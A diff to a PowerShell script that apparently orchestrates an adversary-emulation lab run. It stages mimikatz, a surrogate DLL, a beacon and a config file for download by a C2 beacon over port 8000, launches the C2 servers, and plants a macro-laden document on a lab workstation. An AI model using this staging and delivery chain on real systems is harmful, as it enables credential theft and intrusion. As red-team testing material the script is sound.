@@ -105,6 +105,15 @@ function Start-Phase {
         -Beacon (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') `
         -OutPath (Join-Path $repo "$Staging/macro_embedded.vba") | Out-Null
     Step "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
+    # rerun-v2 T1105: stage the phase-2 tooling under build/out/tools so the beacon
+    # can fetch mimikatz/143.dll/beacon/config-phase7 over :8000 (no direct drops).
+    $toolsDir = Join-Path $repo 'build/out/tools'
+    New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
+    foreach ($t in @('mimikatz.exe', 'c0015_143_surrogate.dll', 'c0015_beacon.ps1', 'config-phase7.ini')) {
+        $src = Join-Path $repo "$Staging/$t"
+        if (Test-Path $src) { Copy-Item $src (Join-Path $toolsDir $t) -Force }
+        else { Step "TOOLS MISSING (build/deploy truoc): $Staging\$t" }
+    }
     & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir 'build/out' | Out-Null
     Wait-Listeners
     Step '== WS01 (rerun-v2, remote via vmrun): install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba =='
